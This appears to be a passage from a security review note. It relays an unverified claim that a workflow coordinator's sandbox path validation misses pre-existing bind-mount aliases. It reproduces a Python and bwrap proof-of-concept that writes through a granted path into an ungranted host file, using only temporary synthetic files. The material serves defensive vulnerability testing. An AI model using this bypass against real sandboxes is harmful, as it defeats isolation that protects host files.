### The lead (UNTRUSTED -- independently verify before touching anything)

H006's reviewer claimed: validation in
`src/workflow_coordinator/execution_boundary.py` checks canonical path
spelling, source type, repository ancestry, destination overlap, and
(after the F001 fix) non-directory hardlink aliasing via `st_nlink` -- but
never checks for a *pre-existing bind mount*. A bind-mount alias is
canonical (passes `Path.resolve()` unchanged), shares the original inode,
and keeps `st_nlink == 1`, so it passes every existing check while still
reaching an ungranted host path (a protected repository file, hidden
`.git` content, or an external file) through a separate writable grant.
The claim covers both exact-file grants and directory grants (a directory
*containing* such an alias), and both at validation time and at
runner/execution-time revalidation.

A minimal reproduction H006 claimed to have run, for the external-file /
exact-file case, using only disposable synthetic files and the system
`bwrap` (reproduced here verbatim for your own independent re-execution --
treat it as a lead to test, not a verified fact):

[source,python]
----
from pathlib import Path
import os, shutil, subprocess, tempfile
import workflow_coordinator.execution_boundary as eb

with tempfile.TemporaryDirectory(prefix='wfc-bind-alias-') as root:
    fixture = Path(root)
    (fixture / 'repo/.git').mkdir(parents=True)
    (fixture / 'repo/writable').mkdir()
    (fixture / 'repo/writable/alias').touch()
    original = fixture / 'external'
    original.write_text('protected host data')
    shutil.copyfile(eb.__file__, fixture / 'execution_boundary.py')
    inner = '''
from pathlib import Path, PurePosixPath
from execution_boundary import Mount, MountMode, validate, run
source = Path('/fixture/repo/writable/alias')
assert source.resolve() == source and source.stat().st_nlink == 1
boundary = validate(Path('/fixture/repo'), [
    Mount(source, PurePosixPath('/repo/writable/alias'), MountMode.WRITABLE),
    Mount(None, PurePosixPath('/tmp'), MountMode.SCRATCH),
])
result = run(boundary, ['/bin/sh', '-c',
    'printf BREACHED > /repo/writable/alias'])
assert result.returncode == 0, result.stderr
'''
    args = ['/usr/bin/bwrap', '--die-with-parent', '--dev', '/dev',
            '--proc', '/proc', '--tmpfs', '/tmp', '--ro-bind', '/usr', '/usr']
    for name in ('/bin', '/sbin', '/lib', '/lib64'):
        if os.path.islink(name):
            args += ['--symlink', os.readlink(name), name]
        elif os.path.exists(name):
            args += ['--ro-bind', name, name]
    args += ['--bind', root, '/fixture', '--bind', str(original),
             '/fixture/repo/writable/alias', '--chdir', '/fixture',
             '--', '/usr/bin/python3', '-c', inner]
